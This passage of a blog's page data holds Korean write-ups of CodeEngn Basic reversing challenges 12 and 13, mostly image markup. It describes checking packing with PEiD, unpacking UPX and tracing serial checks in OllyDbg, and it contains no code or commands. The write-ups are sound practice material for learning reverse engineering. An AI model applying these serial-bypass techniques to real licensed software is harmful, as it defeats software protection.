url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABZElEQVR42n2Oz0vCUADH958VnesURBSU6C0XlFJIEQalpJBdOtjVP8CLeV0ehIF4mXO/3pa+rW3vbXvPpu5gw0M0j5IfPofv4QvfL7N/eXZ6kz8p5FK3V3vZ9Hb6aCdzvNmt1OFBPrubzTAXlYfr2lOhVim8VHPVR7ZcPC/f/ydbKrKlYv65fPdaY0tFBtpf4XQahiGhxAt8Pwg2SCilk0mn0+n1eiPLYlwPm6YpS5JlWY5tU0oJ+eusQwiZzWYQwmaz+VavS5rCOBi5rivLMsZ4HkXxchnH8U/CelgsFhDC93a70WhIqspA0yQBQQhhjBFCdkIYhqup74QgCJK/E0rpfD43DANC+GlCRgMAI9Tv91utFs/zEEJBEKIoch3ng+O63S5CyLIsz/MIITzPcxynKErg+6IiMwoAkiwPJWkgDsThUBBFFWij8RjoOtCBqmm6YQBdH43Hq6BqmgaArhsDRf4FVlBwg1c3wL4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e273bfda7d449a7352059c881881ed6f/c9b55/0.webp 165w,\n/static/e273bfda7d449a7352059c881881ed6f/a93a3/0.webp 257w\"\n              sizes=\"(max-width: 257px) 100vw, 257px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e273bfda7d449a7352059c881881ed6f/04c57/0.png 165w,\n/static/e273bfda7d449a7352059c881881ed6f/96e35/0.png 257w\"\n            sizes=\"(max-width: 257px) 100vw, 257px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e273bfda7d449a7352059c881881ed6f/96e35/0.png\"\n            alt=\"Bin\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>프로그램을 실행시키면 다음과 같은 창이 뜬다. 키를 인증하는 프로그램으로 보인다. 이를 PEiD를 통해 조사해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACB0lEQVR42k2OWW/TQBRG/SdZiirxwhMFCqW0IIRUgeCJX4SAplnI0ibxEu/jzOqMt7FnbDfPyC5IPfp0de59+HS1Z5+/H329eP7l09G3i8MPJwfnr5+cHz/pZp+zzg/Ojh+dvjw4O3749sXjd68enBw9/Xh6+P6NNpzN15Z5ORoNxuPfw+HPwWA0nV5NJr+uBsPJeDAZX45Gk8XcdB3b923fs33fCYOlof8YXGosjmupOOc83iWcM8piFlNKKSGM0n5leZbdtu1+v9/f3rZN3TZtyhPTtjWwjQAAjMUEE8/1EMJSyrqum6ap+zAWRxHAhGBMIESVlEVRFHnuBL7muJ5pmEEIIgBWN0vP86WU1T0QwpvNBgBAMA6CkBCSpmmSJGvT1IIQhEEIEdput/bGRggJIaqqkv8hhLmuCyGKQGQapmGalLIsTfWNpQUAgBBAhBhjWZ63bSvvoZSCEDqOC+EWIRz4PoJIqTrPMsuxNZ7wsixLIYqiEEKUPXcP37lSqq5rpZSUsmkapVR3lDLCSDMta7VaB0Gg67rreV1PKUTfVQhRVlXe0xUL0UmPlDJCUAsBWC1XG8sihEQA6GtdX68RJmnCr+cL23Y453mWGbrhut5utxNF4do2gsgNfG1+fT2ZTmeL2eJmiSndQhhBiBkl7J/TmBFGIwgj1DlE8M9sZljmeDH7C5Q3J/7cjkMyAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ffd7a0a6dfbd4f0d69711b291e69839d/c9b55/1.webp 165w,\n/static/ffd7a0a6dfbd4f0d69711b291e69839d/f2908/1.webp 330w,\n/static/ffd7a0a6dfbd4f0d69711b291e69839d/cd572/1.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ffd7a0a6dfbd4f0d69711b291e69839d/04c57/1.png 165w,\n/static/ffd7a0a6dfbd4f0d69711b291e69839d/d9ecf/1.png 330w,\n/static/ffd7a0a6dfbd4f0d69711b291e69839d/d7398/1.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ffd7a0a6dfbd4f0d69711b291e69839d/d7398/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>패킹이 되어있지 않은 프로그램임을 알 수 있다. 이대로 리버싱을 시작한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 591px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABc0lEQVR42nWQO2/bQBCEZ3kifcd78HGkaEmUZRoSKYnUw6IUIwaSQEgTVymCxIWLIH3+QH6B/7YhJjZcxB+22GJmdzDYH75s10euV96P3/n61m7mwXYaV000q5HkOBsBEy5KLi58WShVKFnIbpGyQNve5aNrHSw+3zeDdztRF/5xIjclVwW8CzgT4ErKWoirMKzCsDKmNKaMoiqO55jNLgH0Qtn/E/Ib11964ujxrSu4S0Q4wYAz/Jd2txuPck+n9tfD+FCYRnljwTX3fek4TifpEQkiEDndEEAnQGjqRWgCbvTmZz87RFmJaA9cAvRy/+3P61UznU6VtpMPc71w3RV6JSBeS5w0yW0cWZsMBkOjNWPMc0/gsG/b3bUwGb5+U+vU3Gq5keY80EMN+c8c22EUBmnaz7LzxFrpS9OB5bKKdMBi4z7W/L3PSnI+OuyGsT6D+hv+7dhNvVRKC199+j5MagEDjIHstYQR8a6wZ7rGQPQEACYiboNQeQcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/27516f4ed3a2ab9712a1a4074fee21b0/c9b55/2.webp 165w,\n/static/27516f4ed3a2ab9712a1a4074fee21b0/f2908/2.webp 330w,\n/static/27516f4ed3a2ab9712a1a4074fee21b0/48c21/2.webp 591w\"\n              sizes=\"(max-width: 591px) 100vw, 591px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/27516f4ed3a2ab9712a1a4074fee21b0/04c57/2.png 165w,\n/static/27516f4ed3a2ab9712a1a4074fee21b0/d9ecf/2.png 330w,\n/static/27516f4ed3a2ab9712a1a4074fee21b0/e4c9a/2.png 591w\"\n            sizes=\"(max-width: 591px) 100vw, 591px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/27516f4ed3a2ab9712a1a4074fee21b0/e4c9a/2.png\"\n            alt=\"findkey\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>길게 보이는 문자열이 키 값인 것으로 추측된다. 그리고 성공메시지에 진입하기 위해서는, 그 직전의 EAX값이 7A2896BF와 같아야 함을 알 수 있다.</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"fcebeae6-b3e3-5c10-a8f1-2c9f218b532e","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-12/","title":"CodeEngn Basic 12","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/f0db8ce627f3adc5f457ddac83113c15/df551/0.png","srcSet":"/static/f0db8ce627f3adc5f457ddac83113c15/bbe8a/0.png 70w,\n/static/f0db8ce627f3adc5f457ddac83113c15/d4d45/0.png 139w,\n/static/f0db8ce627f3adc5f457ddac83113c15/df551/0.png 278w","sizes":"(min-width: 278px) 278px, 100vw"},"sources":[{"srcSet":"/static/f0db8ce627f3adc5f457ddac83113c15/2e00d/0.webp 70w,\n/static/f0db8ce627f3adc5f457ddac83113c15/e7b31/0.webp 139w,\n/static/f0db8ce627f3adc5f457ddac83113c15/705a2/0.webp 278w","type":"image/webp","sizes":"(min-width: 278px) 278px, 100vw"}]},"width":660,"height":398.8489208633094}}}},"body":"<p>Name이 CodeEngn 일때 Serial을 구하시오. (이 문제는 정답이 여러개 나올 수 있는 문제이며 5개의 숫자로 되어있는 정답을 찾아야함, bruteforce 필요)\r\nEx) 11111</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 278px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 82.42424242424244%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADdElEQVR42m2S/08TdxjHn95dr99rsdIvci3l7nr9Ji7IabupWFkDToRASSuVtqwY55Yt/WHJhsmC/YGpSdUs2ZwxARkWNBo2zTYRLS2lvetKKTAyssVtJA0xiz9s/g/LdZvZD75+/CTP8/48r+eBP+9Xf02UtkfXqmOr1QuV6ghfvVJ6Gv9u+8z95z23nl2d30p+8/ule5vvf/aciv7lGHzRF9/qHn5x/vNyfBQunEnYwHxEwbIyV6vE6ZG6WsSUByGP4rZOhGZxohmvd2stXhkRAVMU9AHTnk5m33HKFXIfhFOhUPJqki8X09l0ZjGTXlzI5rLZfPZJbuHxUmYhl80tLdI0DQAIioAIQAQiRAQAFE3BUHTo+pfX19fWuQLHc3yxwPMcxxe4YoEv1l54jmesVgCQoBiOYjiGYSgGAFaahlgsNjU1tbm5WS6XV15FpVJhGEZIRhCogaKokExREI1GE4nE7OxsKpWa/o+ZmZnp/2E2mwFAqVDYbQ6LxfJPC6E4GAy+bPZKRCJhwsFT4dm7D0rLP+aWeJfDCQCCiP7+fqlU4nQ2E4TVZLaZTFaGcRqNRpEIwTBMLBajKCaVSvP54vg9bvxu5tHixo0b4wiCkCQJfn9ffb2ho4M9GSR6e7WhgUaW1ZpMllomIDU3DG1/nNu4Ml28OLl0eWKutLyi0+mEWfz+Pp3OePhws8+n9b2p8Pl0DofObG56acjrPZm8/O2D+R+Wf/ojNf9LuvjzO2c/EGxbrRAIBAQZSjWKKTBshxhXyOUqHMeFhQLsec333icLl66Vfnu6/ay6lcmvnhubY7uvASAURQozSyRSu40hdhtMDQbCqCebLHq9AQB2agwdvZPunqnu06nRL4oPMxszd/LnLi57hwuozEg1Cd/2G/S6/W3tbf7IgWN+T1fQzr5BkhQAOG1dbZH1lgDXHvn6dPeH8RPx80kuEBv3RFaIfcM0SQjFu3Zp9+73NNDO3STTQNv1DabGRkFYy4HB9tgqG1o5NPD9p9GR4MHhlqNncUxMMEMfJ6a73ur8d89qpRLHUJkEV8ikCrkcxyUAYHf0tYUrraE1j39u4N2UyzuCyfW1uwY365mfewLhcBgANJo6pUqlUqs1dTuVAqodauXr7o8OBdJH3ubcxyeaPWO093ZrzwS194RSqdDU1U3e/OpvKCItm6mrceMAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/f0db8ce627f3adc5f457ddac83113c15/c9b55/0.webp 165w,\n/static/f0db8ce627f3adc5f457ddac83113c15/bd3df/0.webp 278w\"\n              sizes=\"(max-width: 278px) 100vw, 278px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/f0db8ce627f3adc5f457ddac83113c15/04c57/0.png 165w,\n/static/f0db8ce627f3adc5f457ddac83113c15/4e29d/0.png 278w\"\n            sizes=\"(max-width: 278px) 100vw, 278px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/f0db8ce627f3adc5f457ddac83113c15/4e29d/0.png\"\n            alt=\"crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>실행 화면이다. 시리얼 키를 입력하는 프로그램이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACGUlEQVR42k2PWW/TQBSF/TNpKPDCE5XowpJShFSB6BO/CClKnMWN06a242Vie8Yz45mxHa9jm74jFyH109HV1T06R7rK2++/Tn5ev/vx7eTm+vjLxdH4dDQ+e3l5NhoPOvp8+rScj8anr68+jMZnr64uXnx6/+brx+PLc2W+1g17N10sZsvlZK5O1JmqraaLhbpaTVRV03VV06aL+VzTJupstlpO54uVvt5a5u/ZVOFCdLJN0zQVSZqkQgjGGKVUcMFo/HRJBOeDz7jgghKapekhy3auo8AIQQg5FyyOXceNIixb2XVd1/eDuo5xEUURF0kcx1yI/k/fNE1ZFF7gKx7Y76xdEEIE0fb+3vP2UsrmGYRQx3HCEEIIwX7PGDvkeZZlxm6nBCEMgxATGiEEPEAoLatKNo38TxxzAADGBEFkWZZjO0Ik+eFgOvYQhiEkhDDG8jx/fHyUUrbPIJgAD2AcUUID38eYyLYr8tz2XCU9ZE3T1FXVSFnXdVmWVVn+m0VRlGXVNE3XdW3bSin7vm/btq7rVkpEieJ4rut6nuthjAEAYQgjhIIg9Pe+aVp+EBimlaZZVQ2dT3UDUkpEsBKG4Xb7YNt2HFMEoWkYxoNBKM3SRF/rjuMmSVLkuWVaAOyTJKnKErju8EvgK/rdnXZ7u9bXm/stZSzCGOGIsjjmLCIYYcyEiDlDGCOCmeCYEH2zsWx7uVn/BbpRJHNWA1pQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/909aec25e7ec7af6eea472b7e5d98a91/c9b55/1.webp 165w,\n/static/909aec25e7ec7af6eea472b7e5d98a91/f2908/1.webp 330w,\n/static/909aec25e7ec7af6eea472b7e5d98a91/cd572/1.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/909aec25e7ec7af6eea472b7e5d98a91/04c57/1.png 165w,\n/static/909aec25e7ec7af6eea472b7e5d98a91/d9ecf/1.png 330w,\n/static/909aec25e7ec7af6eea472b7e5d98a91/d7398/1.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/909aec25e7ec7af6eea472b7e5d98a91/d7398/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>PEiD로 분석해 보니 UPX패킹이 되어 있는 것을 볼 수 있다. 패킹을 풀어준다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.6969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABIUlEQVR42lWNy07CQBhG/5lOS6edK60zQstQbeAtjELZuLCQQFu5hWgwvP8bGNCYeHIW3+bkg9fPr/p8Wl4+3s6n+aGpDl2172bbTbVr57u22reLY/eyrWf7+qlbPb+vF4ducexmu019+QAmORdcCC6V0qlWTulC81zIkVROqUJJq6IYS4WCnhfGUZImWvcBYLlaAg4x8pGHMQ4xEMASI4mAXgcwwAyhEEEAgAF6NzF4ngcAm6YBP/CttcYYrbUQIk3urLE0isvHMqJRv59YawkhCCG4iRAihPzGSZIaYzjnQdCL49j3fUopIYQx5pMrYRjCf36e26aBcjp1RVFOJu6hGGRZ7lw2dvfZcJDnw9Eody4fjyPOKIv/ZFIAwLptvwEwviWQ1DQDyQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/41fcc5875ea99149987e75774a1da0b3/c9b55/2.webp 165w,\n/static/41fcc5875ea99149987e75774a1da0b3/f2908/2.webp 330w,\n/static/41fcc5875ea99149987e75774a1da0b3/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/41fcc5875ea99149987e75774a1da0b3/04c57/2.png 165w,\n/static/41fcc5875ea99149987e75774a1da0b3/d9ecf/2.png 330w,\n/static/41fcc5875ea99149987e75774a1da0b3/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/41fcc5875ea99149987e75774a1da0b3/32056/2.png\"\n            alt=\"UPX\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>패킹을 풀고 올리디버거로 해당 프로그램을 열고, CodeEngn과 임의의 숫자 12345를 넣고 실행시켜 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 278px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 82.42424242424244%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADgklEQVR42m2S7U9bdRTHT++9vS3tbVfW0Yf1gXLv7W3Lk7J1a/eEHTagYxAoaQfSIu3QaTR9YSIswdVEli1hgMlcyAIIE7oNUDZRkfLQlfbeDmhRiaKZiuKymL3Z/gdziyEx8fPq9+ac7+98zoFn93Z+jTz8qzv750cbf/Rkdrq4nb7VR+GvHr9x72n9Z0/657d7Z36/OvXTOx8/pdqe2VqfN4a360LPI9fXw5fgckfEBqZqxfFj8hedRLlTXFIhpJwIeRq31CC0HdeX4QUOpcmVpw+AoQ3UXkNpDXPoDFXS4jgBwWCwO/LBWPTWyNjo3enJhfhiPBGPJ+MLiaXYyvJSIp5YeUDTNAAgKAICAAEIEAEAUDQFHR0d/X39s1/OTk9N3719h0txHMtyKTad4tIplmM5juUYsxkARCiGoxiOYRiKAYCZpiEUCg0MDMzMzMRisa2trfX19cx/yWazDMPwyQgCOVAU5ZMpCtrb2zs7OwcHB4eGhqLR6ESOvccuRqMRAAip1GqxmUym3RZ8sc/n22v2vwgE/IStr/k/n7y/uvZDYoUrsRUDAC+iqalJJBLZbKU6PW0wWgwGM8MUa7VagQDBMEwoFKIoJhaLk8n08BQ7PLn87YPNmzeHEQQhSRI8nsaCAk11tf2cT9/QoGxpLrTblQaDKZcJSM4NQ1tjic2+ifSV0ZVrI3OraxmVSsXP4vE0qlTaU6fK3G6l+2Wp262y2VRGY9GeIZfrXO+12fvzD9d+/Ht8/pfF9M9vXniXt202g9fr5WUQchSTYtg+IS6VSGQ4jvMLBSh9wf1299LVG6u/PXr8ZGd7OblxsWfOXncDAKEocndmsdXC6A9qDDqNXqsmi0xqtQYA9is01Q2jjvpbdefHL32S/mZ5M3onefHKmiuUQvO0VBH/bY9GrTpSWVXpCRx9xeOs9Vntx0mSAoBiS21l4PsKL1sV+OJ83Xvhs+FIL+sNDjsDGf2hEE3q+eIDB5TlR5w6uvggyehoq1pnKCzkhVUcba0KbthbMiebv77c1uU7Eao4fQHHhHrm9c4PJ2pfrfl3z3KCwDE0T4RL88RSiQTHRQBgtTVW+rOHW75zeuaa3xovcXVhEnXursFhd87PLYDf7wcAhSKfkMlkcrkifz/BI9snJ4453j/pXXypnXWcGSlz9tCu24frR6jyswQhVeTnj3469g+e8CpudpKIHAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/90c73498f4730dd503a24180c6c72134/c9b55/3.webp 165w,\n/static/90c73498f4730dd503a24180c6c72134/bd3df/3.webp 278w\"\n              sizes=\"(max-width: 278px) 100vw, 278px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/90c73498f4730dd503a24180c6c72134/04c57/3.png 165w,\n/static/90c73498f4730dd503a24180c6c72134/4e29d/3.png 278w\"\n            sizes=\"(max-width: 278px) 100vw, 278px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/90c73498f4730dd503a24180c6c72134/4e29d/3.png\"\n            alt=\"input crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 322px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.242424242424235%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABaUlEQVR42pWOXUvCUBjH98HsrquustCrKIIoDHoR+hTlRYVUGKSkFvYxikB8jYxcbk2d57jp3NHtbDubsJ2YhkSQ0J8fnN/znIvnz6xGd4MHO8HDSPhobyUaWd7fDqyHFjbCcwishxa31pYim0z8Pn2Zy1zkMlcP2fjd7Xk2FUsmTn4QS13PZOrHycRZJnmavmGIY9N/xvM8Sqnt2IyOcbcLQQe02i1RbPO8ACAUxRbH8QAArsHLktTgeJ7npJ7caovse11FQ0qpaVkMsW1CiOnHME1T1zGZRNM0XdcwxhYhhmFoo5FjOxgbg8FgPB5TSoljM4ZlUkpd1/sVv5znb/0v/6Wu51K/L3Vd9/uy1OsNRyOEEBoOfWYy0emoIiT3ZEVRAACdDugrCoQQShKjImT5lY0/MU2s6xDCgaqWS4Wnx+e+0mdZVpZl5u2D5ZpCQ/icA9cUqrXXfLFQeqkWqpV8qVislGts/QuhXb98pIq1HwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5aba0be02de4c26de17484a35afc70d1/c9b55/4.webp 165w,\n/static/5aba0be02de4c26de17484a35afc70d1/ce133/4.webp 322w\"\n              sizes=\"(max-width: 322px) 100vw, 322px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5aba0be02de4c26de17484a35afc70d1/04c57/4.png 165w,\n/static/5aba0be02de4c26de17484a35afc70d1/fc778/4.png 322w\"\n            sizes=\"(max-width: 322px) 100vw, 322px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5aba0be02de4c26de17484a35afc70d1/fc778/4.png\"\n            alt=\"result crackme\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>잘못된 시리얼이라는 창을 띄우고 종료된다. 올리디버거로 해당 프로그램을 띄워 CodeEngn, 12345를 입력하고 분석한다. 그러던 중 정답을 판정하는 것으로 보이는 분기문을 발견하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.454545454545457%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA4klEQVR42m2OPU7EMBSEx05sy8R4N06c5+fdJNr/hBV0XIGCgitQIHH/IyAL0fFVU8zoG3wzfS232Peh3YpKtG8p3IPuFRwAyEoqpUoS+Id2zIf7OhCdzsfMZJ4WeVJgYAJMKTAnooEz592uC8G5xtoH5x5d0yCnYb1eYozjuI9Dx58f9erLeC/QQ/TCNraSxf+L1rpWtda6PGKm2/WSiJjTxrvn96Naa2QgARqiFk1RWWOMtVYpLaUUfyDntK5LjHGeJ05kXl7lwSCiyHW5TYm6rqOUpnkKIXjvN5utc433/gfxBRIRbodh9AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ed93643a0c7ab493914e0c021a255d2c/c9b55/5.webp 165w,\n/static/ed93643a0c7ab493914e0c021a255d2c/f2908/5.webp 330w,\n/static/ed93643a0c7ab493914e0c021a255d2c/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ed93643a0c7ab493914e0c021a255d2c/04c57/5.png 165w,\n/static/ed93643a0c7ab493914e0c021a255d2c/d9ecf/5.png 330w,\n/static/ed93643a0c7ab493914e0c021a255d2c/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ed93643a0c7ab493914e0c021a255d2c/32056/5.png\"\n            alt=\"JNE\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>EAX와 ESI가 같을 시 정답으로 판정하는 것을 볼 수 있다. 그리고 그 바로 위에서 함수 401383의 return으로 EAX값이 결정되는 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 462px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.96969696969697%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAoElEQVR42i3Kuw6CQBAF0LsoYRZfM2uWWRBRwBjjI8bCxtLajyGxtNMv8I+NxlMfdH76LovXZuNVnRPnRJhlMjHnkz02o5rAABswnDphieM4tfabmEFTScsib5sQgqq2Tb1e1bPgzf3Rv12jAqgiwwAhL7QRCb1oSZQNB5RadLm+68Vzu/OZVtVceAwgSRJ/Oaz266qc2ZTwY4kMEAEGfx9ESA9xDrF+ZAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3a32d4c28efdf6f3ef300c9d760af669/c9b55/6.webp 165w,\n/static/3a32d4c28efdf6f3ef300c9d760af669/f2908/6.webp 330w,\n/static/3a32d4c28efdf6f3ef300c9d760af669/c589b/6.webp 462w\"\n              sizes=\"(max-width: 462px) 100vw, 462px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3a32d4c28efdf6f3ef300c9d760af669/04c57/6.png 165w,\n/static/3a32d4c28efdf6f3ef300c9d760af669/d9ecf/6.png 330w,\n/static/3a32d4c28efdf6f3ef300c9d760af669/e389b/6.png 462w\"\n            sizes=\"(max-width: 462px) 100vw, 462px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3a32d4c28efdf6f3ef300c9d760af669/e389b/6.png\"\n            alt=\"return\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>그 위에는 ESI값이 결정되는 듯한 알고리즘이 보인다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 412px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 69.6969696969697%; position: relative; bottom: 0; left: 0; background-image: 